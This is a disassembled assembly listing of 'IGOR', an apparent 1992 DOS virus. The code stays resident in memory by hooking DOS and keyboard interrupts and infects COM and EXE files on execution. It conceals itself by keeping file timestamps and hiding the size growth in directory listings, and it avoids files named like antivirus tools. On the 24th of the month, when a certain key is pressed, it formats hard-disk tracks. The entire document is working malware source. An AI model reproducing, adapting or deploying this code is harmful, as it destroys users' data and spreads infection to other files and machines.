
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ					                                 ÛÛ
;ÛÛ				IGOR	                                 ÛÛ
;ÛÛ					                                 ÛÛ
;ÛÛ      Created:   12-Jul-92		                                 ÛÛ
;ÛÛ      Passes:    5          Analysis	Options on: none                 ÛÛ
;ÛÛ      (c) 1992 by Igor Ratzkopf - All Rights Reserved July R          ÛÛ
;ÛÛ					                                 ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e		equ	16h
data_2e		equ	469h			;*
data_3e		equ	103h			;*
data_4e		equ	1			;*
data_5e		equ	3			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

igor		proc	far

start::
		jmp	short $+3		; delay for I/O
		nop
		call	sub_1

igor		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		pop	bp
		sub	bp,106h
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	bp
		push	es
		push	ds
		mov	ax,7BCDh
		int	21h			; ??INT Non-standard interrupt
		cmp	bx,7BCDh
		je	loc_4			; Jump if equal
		xor	bx,bx			; Zero register
		push	cs
		pop	ds
		mov	cx,es
		mov	ax,3509h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	word ptr cs:data_11+2[bp],es
		mov	cs:data_11[bp],bx
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	word ptr cs:data_9+2[bp],es
		mov	cs:data_9[bp],bx
		dec	cx
		mov	es,cx
		mov	bx,es:data_5e
		mov	dx,3C3h
		mov	cl,4
		shr	dx,cl			; Shift w/zeros fill
		add	dx,4
		mov	cx,es
		sub	bx,dx
		inc	cx
		mov	es,cx
		mov	ah,4Ah
		int	21h			; DOS Services  ah=function 4Ah
						;  change memory allocation
						;   bx=bytes/16, es=mem segment
		jc	loc_4			; Jump if carry Set
		mov	ah,48h			; 'H'
		dec	dx
		mov	bx,dx
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		jc	loc_4			; Jump if carry Set
		dec	ax
		mov	es,ax
		mov	cx,8
		mov	es:data_4e,cx
		sub	ax,0Fh
		mov	di,data_3e
		mov	es,ax
		mov	si,bp
		add	si,103h
		mov	cx,3C3h
		cld				; Clear direction
		repne	movsb			; Rep zf=0+cx >0 Mov [si] to es:[di]
		mov	ax,2521h
;*		mov	dx,offset loc_3		;*
		db	0BAh, 8Fh, 02h
		push	es
		pop	ds
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ax,2509h
;*		mov	dx,offset loc_2		;*
		db	0BAh, 1Ah, 02h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		push	cs
		pop	ds
loc_4::
		cmp	cs:data_25[bp],5A4Dh
		je	loc_5			; Jump if equal
		mov	bx,offset data_25
		add	bx,bp
		mov	ax,[bx]
		mov	word ptr ds:[100h],ax
		add	bx,2
		mov	al,[bx]
		mov	byte ptr ds:[102h],al
		pop	ds
		pop	es
		pop	bp
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		mov	ax,offset start
		push	ax
		retn
data_9		dw	0, 0			; Data table (indexed access)
data_11		dw	0, 0			; Data table (indexed access)
loc_5::
		mov	bx,cs:data_33[bp]
		mov	dx,cs
		sub	dx,bx
		mov	ax,dx
		add	ax,cs:data_18[bp]
		add	dx,cs:data_20[bp]
		mov	bx,cs:data_17[bp]
		mov	word ptr cs:[216h][bp],bx
		mov	word ptr cs:[218h][bp],ax
		mov	ax,cs:data_19[bp]
		mov	word ptr cs:[20Ch][bp],dx
		mov	word ptr cs:[212h][bp],ax
		pop	ds
		pop	es
		pop	bp
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		mov	ax,0
		cli				; Disable interrupts
		mov	ss,ax
		mov	sp,0
		sti				; Enable interrupts
;*		jmp	far ptr loc_1		;*
sub_1		endp

		db	0EAh, 00h, 00h, 00h, 00h
			                        ;* No entry point to code
		push	ax
		in	al,60h			; port 60h, keybd scan or sw1
		cmp	al,53h			; 'S'
		je	loc_7			; Jump if equal
loc_6::
		pop	ax
		jmp	dword ptr cs:data_11
loc_7::
		mov	ah,2Ah
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dh=month
						;   dl=day, al=day-of-week 0=SUN
		cmp	dl,18h
		jne	loc_6			; Jump if not equal
		mov	ch,0

locloop_8::
		mov	ah,5
		mov	dh,0
		mov	dl,80h
		int	13h			; Disk  dl=drive 0  ah=func 05h
						;  format track=ch or cylindr=cx
						;   al=interleave, dh=head
		inc	ch
		cmp	ch,20h			; ' '
		loopnz	locloop_8		; Loop if zf=0, cx>0

;*		jmp	far ptr loc_31		;*
		db	0EAh,0F0h,0FFh,0FFh,0FFh
		db	0CFh
loc_9::
		pushf				; Push flags
		push	cs
		call	sub_2
		test	al,al
		jnz	loc_ret_12		; Jump if not zero
		push	ax
		push	bx
		push	es
		mov	ah,51h
		int	21h			; DOS Services  ah=function 51h
						;  get active PSP segment in bx
						;*  undocumented function
		mov	es,bx
		cmp	bx,es:data_1e
		jne	loc_11			; Jump if not equal
		mov	bx,dx
		mov	al,[bx]
		push	ax
		mov	ah,2Fh
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		pop	ax
		inc	al
		jnz	loc_10			; Jump if not zero
		add	bx,7
loc_10::
		mov	ax,es:[bx+17h]
		and	ax,1Fh
		xor	al,1Dh
		jnz	loc_11			; Jump if not zero
		and	byte ptr es:[bx+17h],0E0h
		sub	word ptr es:[bx+1Dh],3C3h
		sbb	es:[bx+1Fh],ax
loc_11::
		pop	es
		pop	bx
		pop	ax

loc_ret_12::
		iret				; Interrupt return
			                        ;* No entry point to code
		cmp	ax,4B00h
		je	loc_14			; Jump if equal
		cmp	ah,11h
		je	loc_9			; Jump if equal
		cmp	ah,12h
		je	loc_9			; Jump if equal
		cmp	ax,7BCDh
		jne	loc_13			; Jump if not equal
		jmp	short loc_14
		db	90h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2		proc	near
loc_13::
		jmp	dword ptr cs:data_9
loc_14::
		and	[bx+si],ah
		and	[bx+si],ah
		and	[bx+si],ah
		push	es
		push	ds
		cmp	ax,7BCDh
		jne	loc_15			; Jump if not equal
		push	cs
		pop	ds
		mov	dx,4B7h
		jmp	short loc_16
		db	90h
loc_15::
		call	sub_5
		jc	loc_18			; Jump if carry Set
loc_16::
		mov	ax,4300h
		int	21h			; DOS Services  ah=function 43h
						;  get attrb cx, filename @ds:dx
		jc	loc_19			; Jump if carry Set
		test	cl,1
		jz	loc_17			; Jump if zero
		and	cl,0FEh
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		jc	loc_19			; Jump if carry Set
loc_17::
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_19			; Jump if carry Set
		mov	bx,ax
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=time
		mov	al,cl
		or	cl,1Fh
		dec	cx
		dec	cx
		xor	al,cl
		jz	loc_19			; Jump if zero
		push	cs
		pop	ds
		mov	data_21,cx
		mov	data_22,dx
		mov	ah,3Fh			; '?'
		mov	cx,20h
		mov	dx,offset data_25
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		jc	loc_18			; Jump if carry Set
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_18			; Jump if carry Set
		cmp	cs:data_25,5A4Dh
		je	loc_21			; Jump if equal
		mov	cx,ax
		sub	cx,3
		mov	cs:data_24,cx
		call	sub_3
		jc	loc_18			; Jump if carry Set
		mov	ah,40h			; '@'
		mov	dx,offset data_23
		mov	cx,3
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_18::
		mov	cx,cs:data_21
		mov	dx,cs:data_22
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		mov	ah,3Eh
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
loc_19::
		pop	ds
		pop	es
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		cmp	ax,7BCDh
		jne	loc_20			; Jump if not equal
		mov	bx,ax
loc_20::
		jmp	dword ptr cs:data_9
loc_21::
		mov	cx,cs:data_32
		mov	cs:data_17,cx
		mov	cx,cs:data_33
		mov	cs:data_18,cx
		mov	cx,cs:data_31
		mov	cs:data_19,cx
		mov	cx,cs:data_30
		mov	cs:data_20,cx
		push	ax
		push	dx
		call	sub_4
		sub	dx,cs:data_29
		mov	cs:data_33,dx
		mov	cs:data_32,ax
		pop	dx
		pop	ax
		add	ax,3C3h
		adc	dx,0
		push	ax
		push	dx
		call	sub_4
		sub	dx,cs:data_29
		add	ax,40h
		mov	cs:data_30,dx
		mov	cs:data_31,ax
		pop	dx
		pop	ax
		push	bx
		push	cx
		mov	cl,7
		shl	dx,cl			; Shift w/zeros fill
		mov	bx,ax
		mov	cl,9
		shr	bx,cl			; Shift w/zeros fill
		add	dx,bx
		and	ax,1FFh
		jz	loc_22			; Jump if zero
		inc	dx
loc_22::
		pop	cx
		pop	bx
		mov	cs:data_26,ax
		mov	cs:data_27,dx
		call	sub_3
		jc	loc_23			; Jump if carry Set
		mov	ah,40h			; '@'
		mov	dx,data_2e
		mov	cx,20h
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_23::
		jmp	loc_18
sub_2		endp

data_17		dw	0			; Data table (indexed access)
data_18		dw	0			; Data table (indexed access)
data_19		dw	0			; Data table (indexed access)
data_20		dw	0			; Data table (indexed access)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3		proc	near
		mov	ah,40h			; '@'
		mov	dx,103h
		mov	cx,3C3h
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jc	loc_24			; Jump if carry Set
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_24			; Jump if carry Set
		clc				; Clear carry flag
		retn
loc_24::
		stc				; Set carry flag
		retn
sub_3		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_4		proc	near
		push	bx
		push	cx
		mov	cl,0Ch
		shl	dx,cl			; Shift w/zeros fill
		mov	bx,ax
		mov	cl,4
		shr	bx,cl			; Shift w/zeros fill
		add	dx,bx
		and	ax,0Fh
		pop	cx
		pop	bx
		retn
sub_4		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5		proc	near
		push	si
		push	cx
		mov	si,dx
		mov	cx,128h

locloop_25::
		cmp	byte ptr [si],2Eh	; '.'
		je	loc_26			; Jump if equal
		inc	si
		loop	locloop_25		; Loop if cx > 0

loc_26::
		cmp	word ptr [si-2],544Fh
		jne	loc_27			; Jump if not equal
		cmp	word ptr [si-4],5250h
		je	loc_30			; Jump if equal
loc_27::
		cmp	word ptr [si-2],4E41h
		jne	loc_28			; Jump if not equal
		cmp	word ptr [si-4],4353h
		je	loc_30			; Jump if equal
loc_28::
		cmp	word ptr [si-2],2041h
		jne	loc_29			; Jump if not equal
		cmp	word ptr [si-4],454Ch
		je	loc_30			; Jump if equal
loc_29::
		pop	cx
		pop	si
		clc				; Clear carry flag
		retn
loc_30::
		pop	cx
		pop	si
		stc				; Set carry flag
		retn
sub_5		endp

data_21		dw	0
data_22		dw	0
data_23		db	0E9h
data_24		dw	9090h
data_25		dw	0CD90h			; Data table (indexed access)
data_26		dw	20h
data_27		dw	0
		db	0, 0
data_29		dw	0
		db	0, 0, 0, 0
data_30		dw	0
data_31		dw	0
		db	0, 0
data_32		dw	0
data_33		dw	0			; Data table (indexed access)
		db	15 dup (0)
copyright	db	'(c) 1992 by Igor Ratzkopf - All '
		db	'Rights Reserved July R'

seg_a		ends



		end	start
